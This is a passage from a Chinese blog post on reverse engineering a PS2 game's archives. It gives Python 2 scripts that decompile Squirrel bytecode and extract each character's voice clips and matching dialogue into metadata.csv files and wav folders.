class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: decompile_cnut.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Decompile cnut files.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text2shift_jis</span>(<span class="params">data</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">while</span> i &lt; length:</span><br><span class="line">        c = data[i]</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">            j = i + <span class="number">1</span></span><br><span class="line">            string = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> data[j] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                string += data[j]</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\x00&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">                string = <span class="built_in">eval</span>(<span class="string">&#x27;b&quot;&#x27;</span> + string.replace(<span class="string">&#x27;\\x00&#x27;</span>, <span class="string">&#x27;\\x&#x27;</span>) + <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">                string = string.decode(<span class="string">&#x27;shift-jis&#x27;</span>)</span><br><span class="line">                string = string.replace(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\\r&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            result += <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">            i = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += c</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.encode(<span class="string">&#x27;shift-jis&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">directory</span>):</span><br><span class="line">    <span class="keyword">for</span> root, directories, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">            code = <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.cnut&#x27;</span>) <span class="keyword">and</span> os.path.exists(<span class="string">&#x27;./nutcracker.exe&#x27;</span>):</span><br><span class="line">                filename = os.path.join(root, filename)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Decompiling %s...&#x27;</span> % filename)</span><br><span class="line">                code = subprocess.check_output([<span class="string">&#x27;./nutcracker.exe&#x27;</span>, filename])</span><br><span class="line">            <span class="keyword">elif</span> filename.endswith(<span class="string">&#x27;.nut&#x27;</span>) <span class="keyword">or</span> filename.endswith(<span class="string">&#x27;.NUT&#x27;</span>):</span><br><span class="line">                filename = os.path.join(root, filename)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    code = f.read()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;\\x00&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Translating %s...&#x27;</span> % filename)</span><br><span class="line">                    code = text2shift_jis(code)</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename.replace(<span class="string">&#x27;.cnut&#x27;</span>, <span class="string">&#x27;.nut&#x27;</span>), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仅在 Python2 与 Windows 下运行，同目录下需要存在 <code>nutcraker.exe</code>。例如 <code>python2 decompile_cnut.py ./xxxx/SYSTEM/</code> 可以自动反编译 <code>./xxxx/SYSTEM/</code> 下所有的 <code>.cnut</code> 文件，并且对于所有的 <code>.nut</code> 文件自动处理 <code>shift-jis</code> 编码字符串。</p><h1 id="目标数据提取"><a href="# 目标数据提取" class="headerlink" title="目标数据提取"></a>目标数据提取 </h1><p> 至此，针对这个 PS2 游戏已经破解的差不多了，所有文件都解压完成，总结一下每个 <code>.BIN</code> 文件都是做什么的：</p><p><code>NOTMAL.BIN</code>：主要包含了程序中的一些界面图片，以及其他几个文件的解压后目录结构与文件名，还包含了字库图片。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/1.jpg" alt="恢复出的 NORMAL 文件夹"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/9.png" alt="恢复出的 NORMAL 中的界面图片"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/8.bmp" alt="恢复出的 NORMAL 中的字库文件"></p><p><code>SYSTEM.BIN</code>：包含了 Squirrel 脚本的主逻辑。一半 <code>.cnut</code> 字节码文件，一半 <code>.nut</code> 明文文件。推测经常被调用的函数被封装到 <code>.cnut</code> 中。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/2.jpg" alt="恢复出的 SYSTEM 文件夹"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/3.jpg" alt="恢复出的 SYSTEM 文件夹"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/10.jpg" alt="恢复出的 SYSTEM 中的 squirrel 脚本"></p><p><code>SCENE_ID.BIN</code>：全部都是 <code>.cnut</code>，一个文件代表一个游戏场景的流程，反编译后每一个 <code>.nut</code> 中都是一个数组，数组中每一个对象都代表一个游戏动作。推测 <code>SYSTEM</code> 主要通过游戏主程序调用 <code>SYSTEM_ID</code> 中的场景。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/4.jpg" alt="恢复出的 SCENE_ID 文件夹"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/11.jpg" alt="恢复出的 SCENE_ID 中的 squirrel 脚本"></p><p><code>SCENEDAT.BIN</code>：全部都是 <code>.tm2</code> 图片，游戏中所有任务、场景、贴图资源，</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/5.jpg" alt="恢复出的 SCENEDAT 文件夹"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/13.png" alt="恢复出的 SCENEDAT 中的游戏图片"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/14.png" alt="恢复出的 SCENEDAT 中的游戏图片"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/15.png" alt="恢复出的 SCENEDAT 中的游戏图片"></p><p><code>SOUND_ID.BIN</code>：游戏中的音效、BGM 等（<code>.STV</code> 文件），部分非音频文件作用未知。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/6.jpg" alt="恢复出的 SOUND_ID 文件夹"></p><p><code>VOICE_ID.BIN</code>：游戏中所有任务的语音音频。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/7.jpg" alt="恢复出的 VOICE_ID 文件夹"></p><p>我们的最终目标是提取出每个角色说的语音音频以及对应的台词，这些数据主要放在 <code>SCENE_ID</code> 中，分析反编译后的 <code>.nut</code> 可以发现，该目录下所有脚本都返回了一个列表，结合 <a href="https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"> 前文 </a> 中对 <code>SYSTEM</code> 的初步分析，每个脚本文件都是一个场景下的顺序序列，这个列表中每一个元素都是一个动作，首先来分析一下那些动作是让角色说话。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/16.jpg" alt="SCENE_ID 中一个脚本的样例"></p><p>直接搜索 voice，可以看到每一个 voice 后面都跟着一个数字，推测该数字就是 <code>VOICE_ID</code> 中文件的序号。从 <a href="https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"> 前面 </a> 的分析可以得知，当 <code>tagname</code> 为 <code>ch</code> 的时候就是打印在屏幕上的台词。</p><p>那么可以找到规律：在一个场景中，如果与奥 <code>tagname</code> 是 <code>dipname</code> 时，播放 <code>VOICE_ID</code> 中对应的音频，并且说话者就是 <code>name</code>，在之后的动作中如果 <code>tagname</code> 是 <code>ch</code>，那么就对应了上一个遇到的 <code>voice</code> 对应的台词，<code>ch</code> 可多次出现，知道遇到 <code>tagname</code> 为 <code>p</code> 的时候停止。</p><p>此外，推测 <code>tagname</code> 为 <code>afterpage</code> 的时候代表对话框翻页，<code>sagepoint</code> 代表自动保存，<code>msgon</code> 和 <code>msgoff</code> 代表显示、关闭对话框。</p><p>验证一下上图中 15765 号音频与对应的台词是否对的上。</p><audio id="audio" controls preload="none">      <source id="wav" src="./15765.wav"></audio><p>基于此，可以写一个对应的音频和台词提取脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: load_scene.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Load wav audio file and scripts from SCENE_ID and </span></span><br><span class="line"><span class="comment"># VOICE_ID.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_data</span>(<span class="params">scenes, voices, directory</span>):</span><br><span class="line">    output_directory = os.path.join(directory, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;voice_data&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_directory):</span><br><span class="line">        os.mkdir(output_directory)</span><br><span class="line"></span><br><span class="line">    output_scenes_name = os.path.join(</span><br><span class="line">        output_directory,</span><br><span class="line">        os.path.basename(directory.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>).rstrip(<span class="string">&quot;/&quot;</span>)) + <span class="string">&quot;.json&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    output_voices_name = os.path.join(</span><br><span class="line">        output_directory,</span><br><span class="line">        os.path.basename(directory.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>).rstrip(<span class="string">&quot;/&quot;</span>)) + <span class="string">&quot;.voices.json&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_scenes_name, <span class="string">&quot;wt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(scenes, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_voices_name, <span class="string">&quot;wt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(voices, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    voice_dir = os.path.join(directory, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;VOICE_ID&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name, voice <span class="keyword">in</span> voices.items():</span><br><span class="line">        name_dir = os.path.join(output_directory, name)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(name_dir):</span><br><span class="line">            os.mkdir(name_dir)</span><br><span class="line"></span><br><span class="line">        wav_dir = os.path.join(name_dir, <span class="string">&quot;wavs&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(wav_dir):</span><br><span class="line">            os.mkdir(wav_dir)</span><br><span class="line"></span><br><span class="line">        meta_file = os.path.join(name_dir, <span class="string">&quot;metadata.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(meta_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> voice_id, sentence <span class="keyword">in</span> voice:</span><br><span class="line">                wav_filename = <span class="string">b&quot;%05d.wav&quot;</span> % voice_id</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;cp %s -&gt; %s&quot;</span></span><br><span class="line">                    % (</span><br><span class="line">                        os.path.join(voice_dir, wav_filename),</span><br><span class="line">                        os.path.join(wav_dir, wav_filename),</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(voice_dir, wav_filename), <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> g, <span class="built_in">open</span>(</span><br><span class="line">                    os.path.join(wav_dir, wav_filename), <span class="string">&quot;wb&quot;</span></span><br><span class="line">                ) <span class="keyword">as</span> h:</span><br><span class="line">                    h.write(g.read())</span><br><span class="line"></span><br><span class="line">                f.write(wav_filename + <span class="string">b&quot;|&quot;</span> + sentence.encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">directory</span>):</span><br><span class="line">    scenes = &#123;&#125;</span><br><span class="line">    voices = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> root, directories, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.nut&quot;</span>) <span class="keyword">or</span> filename.endswith(<span class="string">&quot;.NUT&quot;</span>):</span><br><span class="line">                basename = <span class="string">&quot;.&quot;</span>.join(filename.split(<span class="string">&quot;.&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">                filename = os.path.join(root, filename)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Loading %s...&quot;</span> % filename)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    code = f.read().strip().decode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> code.startswith(<span class="string">&quot;return [&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;  Found scene at %s&quot;</span> % filename)</span><br><span class="line">                    code = <span class="string">&quot;\n&quot;</span>.join(</span><br><span class="line">                        (</span><br><span class="line">                            i.replace(<span class="string">&#x27;\t\t[&quot;&#x27;</span>, <span class="string">&quot;\t\t&quot;</span>, <span class="number">1</span>)</span><br><span class="line">                            .replace(<span class="string">&#x27;&quot;] = &#x27;</span>, <span class="string">&quot; = &quot;</span>, <span class="number">1</span>)</span><br><span class="line">                            .replace(<span class="string">&quot; = &quot;</span>, <span class="string">&#x27;&quot;: &#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                            .replace(<span class="string">&quot;\t\t&quot;</span>, <span class="string">&#x27;\t\t&quot;&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                            <span class="keyword">for</span> i <span class="keyword">in</span> code.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    scene = json.loads(code[<span class="number">7</span>:].rstrip(<span class="string">&quot;;&quot;</span>))</span><br><span class="line">                    scenes[basename] = scene</span><br><span class="line"></span><br><span class="line">                    sentence = voice_id = voice_name = <span class="literal">None</span></span><br><span class="line">                    start = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">for</span> ele <span class="keyword">in</span> scene:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;voice&quot;</span> <span class="keyword">in</span> ele:</span><br><span class="line">                            <span class="keyword">assert</span> ele[<span class="string">&quot;tagname&quot;</span>] <span class="keyword">in</span> (<span class="string">&quot;dispname&quot;</span>, <span class="string">&quot;entryvoice&quot;</span>), ele[</span><br><span class="line">                                <span class="string">&quot;tagname&quot;</span></span><br><span class="line">                            ]</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> start <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;Already started!&quot;</span>, voice_id)</span><br><span class="line"></span><br><span class="line">                            voice_id = ele[<span class="string">&quot;voice&quot;</span>]</span><br><span class="line">                            voice_name = ele[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">                            sentence = <span class="string">&quot;&quot;</span></span><br><span class="line">                            start = <span class="literal">True</span></span><br><span class="line">                            <span class="comment"># print(&quot;%d start&quot; % voice_id)</span></span><br><span class="line">                        <span class="keyword">elif</span> start:</span><br><span class="line">                            <span class="keyword">if</span> ele.get(<span class="string">&quot;tagname&quot;</span>, <span class="literal">None</span>) == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">                                start = <span class="literal">False</span></span><br><span class="line">                                <span class="comment"># print(&quot;%d stop&quot; % voice_id)</span></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> sentence <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                                    <span class="keyword">if</span> voice_name <span class="keyword">not</span> <span class="keyword">in</span> voices:</span><br><span class="line">                                        voices[voice_name] = <span class="built_in">list</span>()</span><br><span class="line">                                    voices[voice_name].append((voice_id, sentence))</span><br><span class="line">                            <span class="keyword">elif</span> ele.get(<span class="string">&quot;tagname&quot;</span>, <span class="literal">None</span>) == <span class="string">&quot;ch&quot;</span> <span class="keyword">and</span> <span class="string">&quot;text&quot;</span> <span class="keyword">in</span> ele:</span><br><span class="line">                                sentence += ele[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;\ntalk(&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;  Found scene at %s&quot;</span> % filename)</span><br><span class="line">                    scene = code.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    scenes[basename] = scene</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> scene:</span><br><span class="line">                        line = line.encode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> line.startswith(<span class="string">&quot;talk&quot;</span>):</span><br><span class="line">                            line = <span class="built_in">eval</span>(</span><br><span class="line">                                line[<span class="number">4</span>:]</span><br><span class="line">                                .rstrip(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">                                .replace(<span class="string">&quot;null&quot;</span>, <span class="string">&quot;None&quot;</span>)</span><br><span class="line">                                .replace(<span class="string">&quot;\\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                                .replace(<span class="string">&quot;0x04000000&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            )</span><br><span class="line">                            voice_name = line[<span class="number">0</span>]</span><br><span class="line">                            voice_id = line[-<span class="number">1</span>]</span><br><span class="line">                            sentence = line[-<span class="number">2</span>]</span><br><span class="line">                            <span class="keyword">if</span> line[-<span class="number">1</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                                voice_name = voice_name.decode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line">                                sentence = sentence.decode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line">                                <span class="keyword">if</span> voice_name <span class="keyword">not</span> <span class="keyword">in</span> voices:</span><br><span class="line">                                    voices[voice_name] = <span class="built_in">list</span>()</span><br><span class="line">                                voices[voice_name].append((voice_id, sentence))</span><br><span class="line"></span><br><span class="line">    save_data(scenes, voices, directory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>该脚本仅在 Python2 下运行，例如 <code>python2 load_scene.py ./xxxx/SCENE_ID/</code> 将自动根据 <code>./xxxx/SCENE_ID/</code> 中的每一个脚本从 <code>./xxxx/VOICE_ID/</code> 中提取对应的音频以及台词.</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/17.jpg" alt="从 SCENE_ID 中提取的数据"></p><p>同时会在 <code>./xxxx/voice_data/</code> 根据每个角色新建目录，目录中保存了 <code>metadata.csv</code> 以及包含了该角色所有语音的 <code>wavs</code> 目录。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/20.jpg" alt="metadata.wav"></p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/22.jpg" alt="wavs"></p><p>此外还会将游戏所有场景数据保存在一个 <code>./xxxx/voice_data/SCENE_ID.json</code> 中，</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/18.jpg" alt="SCENE_ID.json"></p><p>以及将所有场景下的音频文件 ID 与台词数据保存在 <code>./xxxx/voice_data/SCENE_ID.voices.json</code> 中，便于 debug。</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/19.jpg" alt="SCENE_ID.voices.json"></p><p>该脚本还兼容了此游戏系列的另一款同类游戏的 <code>SCENE_ID</code> 格式，例如：</p><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/21.jpg" alt="另一款同一列游戏 SCENE_ID 中不同的脚本格式"></p><p>直接调用了 <code>talk</code> 函数使角色说话，从左至右依次是说话人、未知、台词、以及程序基址 + 音频 ID。</p><p>最终的 <code>voice_data</code> 里就是我们的提取的目标 <code>metadata.csv</code> 以及 `wavs。</p>]]></content>
      
      
      <categories>
          
          <category> Hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReverseEngineering </tag>
            
